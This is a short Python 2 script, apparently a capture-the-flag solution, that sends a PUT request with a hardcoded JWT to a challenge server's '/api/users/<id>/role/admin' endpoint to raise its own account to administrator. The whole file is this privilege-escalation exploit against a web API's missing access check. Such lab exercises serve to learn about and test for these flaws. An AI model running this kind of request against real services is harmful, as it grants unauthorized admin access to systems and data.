import base64
import requests
import urllib 

url = 'http://on.acictf.com:'
port = '34075/'
base = url + port

auth_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJkMDA3NTJjOC0yZjc4LTRjOWEtODUxOC02NzRkNDNlZjE4NzkiLCJpYXQiOjE1NDQyMzg3NTF9.iCbP-xo_NgPccSPOEBQrJ0-3nHMWUS0jN0vyiOm13wY'

headers = {
    'AuthToken': auth_token
}

uid = 'd00752c8-2f78-4c9a-8518-674d43ef1879'

url = base + 'api/users/' + uid + '/role/admin'

#r = requests.get('http://on.acictf.com:34075/messages')
r = requests.put(url, headers=headers)
print r.content